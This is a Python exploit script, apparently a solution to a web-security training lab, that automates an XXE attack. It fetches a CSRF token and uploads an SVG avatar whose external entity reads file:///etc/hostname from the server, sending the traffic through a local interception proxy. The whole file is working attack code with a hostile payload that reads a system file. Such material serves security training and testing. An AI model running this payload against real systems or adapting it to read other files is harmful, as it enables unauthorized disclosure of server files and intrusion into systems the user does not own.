import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf


def exploit_xxe(s, url):

    # Get CSRF token
    post_url = url + "/post?postId=1"
    csrf_token = get_csrf_token(s, post_url)

    print("(+) Exploiting XXE injection...")
    comment_url = url + "/post/comment"
    params = {"csrf": csrf_token,
    "postId": "1",
    "comment": "test",
    "name": "test",
    "avatar": ('test.svg', '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>', 'image/svg+xml'),
    "email": "test@test.ca",
    "website": "http://www.test.ca"}

    boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    m = MultipartEncoder(fields=params, boundary=boundary)

    headers = {'Content-Type': m.content_type}

    r = s.post(comment_url, data=m, headers=headers, verify=False, proxies=proxies)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)


if __name__ == "__main__":
    main()